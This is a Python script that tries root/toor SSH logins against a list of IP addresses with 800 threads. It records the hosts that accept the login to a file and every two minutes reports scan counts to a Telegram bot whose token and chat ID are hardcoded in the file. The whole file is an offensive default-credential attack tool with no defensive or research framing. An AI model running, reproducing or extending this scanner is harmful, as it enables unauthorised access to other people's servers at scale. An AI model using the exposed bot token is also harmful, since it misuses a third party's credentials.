import paramiko
import socket
import threading
from concurrent.futures import ThreadPoolExecutor
import time
import requests

INPUT_FILE = 'ip.txt'
OUTPUT_FILE = 'live_ssh_verified.txt'
USERNAME = 'root'
PASSWORD = 'toor'
BOT_TOKEN = '7691507387:AAEl81yaGi3Te1KOqOtBqPahu_fjzXljQs4'
CHAT_ID = '5326706151'

live_count = 0
bad_count = 0
lock = threading.Lock()

def is_ssh_accessible(ip):
    global live_count, bad_count
    try:
        sock = socket.socket()
        sock.settimeout(3)
        sock.connect((ip, 22))
        sock.close()
    except:
        with lock:
            bad_count += 1
        return

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, port=22, username=USERNAME, password=PASSWORD, timeout=5)
        with lock:
            live_count += 1
            print(f"[+] SSH FOUND: {ip}")
            with open(OUTPUT_FILE, 'a') as f:
                f.write(f"{ip}\n")
        ssh.close()
    except:
        with lock:
            bad_count += 1

def send_telegram_update():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    while True:
        time.sleep(120)  # Every 2 minutes
        total = live_count + bad_count
        message = f"SCANNED: {total}\nGOOD: {live_count}\nBAD: {bad_count}\nTOTAL: {total}"
        try:
            requests.post(url, data={'chat_id': CHAT_ID, 'text': message})
            print("[Update] Sent to Telegram.")
        except Exception as e:
            print(f"[Error] Telegram send failed: {e}")

def main():
    threading.Thread(target=send_telegram_update, daemon=True).start()
    with open(INPUT_FILE, 'r') as f:
        ips = [line.strip() for line in f if line.strip()]

    with ThreadPoolExecutor(max_workers=800) as executor:
        executor.map(is_ssh_accessible, ips)

if __name__ == '__main__':
    main()
